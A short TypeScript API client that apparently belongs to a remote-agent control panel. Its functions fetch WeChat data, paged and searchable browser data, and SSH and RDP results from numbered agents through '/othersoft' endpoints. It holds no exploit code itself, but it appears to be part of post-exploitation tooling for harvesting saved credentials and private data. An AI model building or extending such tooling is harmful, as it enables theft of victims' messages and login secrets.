import { api } from './client';
import type { WeChatResult, BrowserDataType, BrowserPagedResult, BrowserSearchResult, SSHResult, RDPResult } from '../types/models';

export function getWeChat(agentId: string): Promise<WeChatResult> {
  return api.post<WeChatResult>(`/othersoft/${agentId}/wechat`);
}

export function getBrowser<T>(agentId: string, type: BrowserDataType, offset: number, limit: number): Promise<BrowserPagedResult<T>> {
  return api.post<BrowserPagedResult<T>>(`/othersoft/${agentId}/browser`, { type, offset, limit });
}

export function searchBrowser<T>(agentId: string, type: BrowserDataType, keyword: string): Promise<BrowserSearchResult<T>> {
  return api.post<BrowserSearchResult<T>>(`/othersoft/${agentId}/browser/search`, { type, keyword });
}

export function getSSH(agentId: string): Promise<SSHResult> {
  return api.post<SSHResult>(`/othersoft/${agentId}/ssh`);
}

export function getRDP(agentId: string): Promise<RDPResult> {
  return api.post<RDPResult>(`/othersoft/${agentId}/rdp`);
}
